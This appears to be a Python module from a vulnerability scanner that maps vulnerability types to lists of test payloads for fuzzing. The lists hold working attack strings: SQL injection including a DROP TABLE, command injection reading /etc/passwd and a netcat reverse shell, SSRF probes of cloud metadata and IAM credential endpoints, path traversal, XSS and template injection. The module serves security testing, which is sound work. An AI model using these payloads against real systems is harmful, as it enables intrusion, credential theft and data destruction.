"""Vulnerability-type-specific payload generation.

Generates concrete test inputs from static analysis findings.
No code execution required — safe to run on any finding.
"""
from __future__ import annotations

from vulnscanner.fuzzer.base import FuzzPayload
from vulnscanner.models import Finding, VulnType

# ── Payload libraries ──────────────────────────────────────────────────────────

_SQL = [
    ("' OR '1'='1", "Auth bypass (OR true)"),
    ("' OR 1=1--", "Auth bypass with comment"),
    ("'; DROP TABLE users; --", "Destructive DROP TABLE"),
    ("' UNION SELECT NULL,NULL,NULL--", "UNION-based enumeration"),
    ("' AND 1=CONVERT(int,@@version)--", "Error-based version leak (MSSQL)"),
    ("1' AND SLEEP(3)--", "Time-based blind (MySQL)"),
    ("1' AND pg_sleep(3)--", "Time-based blind (PostgreSQL)"),
    ("' OR ''='", "Tautology injection"),
    ("admin'--", "Comment truncation"),
    ("1; SELECT * FROM information_schema.tables--", "Schema enumeration"),
]

_CMD = [
    ("; id", "Unix id command"),
    ("| id", "Pipe to id"),
    ("`id`", "Backtick subshell"),
    ("$(id)", "Dollar subshell"),
    ("; cat /etc/passwd", "Passwd file read"),
    ("& whoami", "Windows whoami"),
    ("\n/bin/sh -i", "Newline injection to shell"),
    ("$(curl http://127.0.0.1/)", "SSRF via command injection"),
    ("; sleep 5", "Time-based detection"),
    ("| nc 127.0.0.1 4444 -e /bin/sh", "Reverse shell attempt (local only)"),
]

_PATH = [
    ("../../../etc/passwd", "Unix directory traversal"),
    ("..\\..\\..\\windows\\win.ini", "Windows traversal"),
    ("....//....//etc/passwd", "Double-dot bypass"),
    ("%2e%2e%2fetc%2fpasswd", "URL-encoded traversal"),
    ("..%252f..%252fetc%252fpasswd", "Double URL-encoded traversal"),
    ("/etc/passwd", "Absolute path"),
    ("C:\\Windows\\win.ini", "Windows absolute path"),
    ("%00../etc/passwd", "Null byte injection"),
    ("....\\....\\windows\\win.ini", "Backslash mixed traversal"),
    ("../../../proc/self/environ", "Process environment leak"),
]

_XSS = [
    ("<script>alert(document.domain)</script>", "Basic script injection"),
    ('"><script>alert(1)</script>', "Tag breakout"),
    ("<img src=x onerror=alert(1)>", "Event handler injection"),
    ("javascript:alert(1)", "JavaScript URL"),
    ("<svg onload=alert(1)>", "SVG injection"),
    ("';alert(String.fromCharCode(88,83,83))//", "String.fromCharCode bypass"),
    ("<iframe src=javascript:alert(1)>", "Iframe injection"),
    ("<<SCRIPT>alert('XSS');//<</SCRIPT>", "Nested tag bypass"),
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", "URL-encoded XSS"),
    ("<body onload=alert(1)>", "Body onload"),
]

_SSRF = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
    ("http://127.0.0.1:22", "Localhost SSH port probe"),
    ("http://127.0.0.1:6379", "Redis probe"),
    ("http://127.0.0.1:5432", "PostgreSQL probe"),
    ("file:///etc/passwd", "Local file read via file://"),
    ("dict://127.0.0.1:11211/", "Memcached probe"),
    ("http://0.0.0.0/", "Zero IP bypass"),
]

_REDIRECT = [
    ("https://evil.example.com", "Direct external redirect"),
    ("//evil.example.com", "Protocol-relative redirect"),
    ("javascript:alert(document.cookie)", "JavaScript pseudo-URL"),
    ("data:text/html,<script>alert(1)</script>", "Data URI XSS"),
    ("https://evil.example.com?next=legit.example.com", "Parameter confusion"),
    ("\\\\evil.example.com", "Backslash bypass"),
    ("https:evil.example.com", "Colon bypass"),
    ("/\\evil.example.com", "Slash-backslash bypass"),
    ("%0d%0a%0d%0aHTTP/1.1 200 OK", "HTTP response splitting"),
    ("https://legit.example.com.evil.example.com", "Subdomain confusion"),
]

_SSTI = [
    ("{{7*7}}", "Jinja2 arithmetic test"),
    ("{{config}}", "Jinja2 config dump"),
    ("{{''.__class__.__mro__[1].__subclasses__()}}", "Jinja2 RCE prep"),
    ("${7*7}", "Freemarker arithmetic"),
    ("#{7*7}", "Thymeleaf arithmetic"),
    ("<%= 7*7 %>", "ERB arithmetic"),
    ("{{request.environ}}", "Jinja2 environ dump"),
    ("*{7*7}", "Spring EL arithmetic"),
]

_DESER = [
    # These are base64-encoded ysoserial-style payloads (non-functional, for detection testing only)
    ("rO0AB", "Java serialized object magic bytes"),
    ("0xACED0005", "Java serialization hex magic"),
]

_PAYLOADS: dict[VulnType, list[tuple[str, str]]] = {
    VulnType.SQL_INJECTION: _SQL,
    VulnType.COMMAND_INJECTION: _CMD,
    VulnType.PATH_TRAVERSAL: _PATH,
    VulnType.XSS: _XSS,
    VulnType.SSRF: _SSRF,
    VulnType.OPEN_REDIRECT: _REDIRECT,
    VulnType.SSTI: _SSTI,
    VulnType.INSECURE_DESERIALIZATION: _DESER,
}


def generate_payloads(finding: Finding) -> list[FuzzPayload]:
    """Return concrete test payloads for a static analysis finding."""
    entries = _PAYLOADS.get(finding.vuln_type, [])
    return [
        FuzzPayload(
            value=val,
            vuln_type=finding.vuln_type,
            description=desc,
            source_finding=finding,
        )
        for val, desc in entries
    ]


def generate_all_payloads(findings: list[Finding]) -> list[FuzzPayload]:
    """Generate payloads for a list of findings, deduplicating by vuln_type."""
    seen_types: set[VulnType] = set()
    result: list[FuzzPayload] = []
    for f in findings:
        if f.vuln_type not in seen_types:
            result.extend(generate_payloads(f))
            seen_types.add(f.vuln_type)
    return result
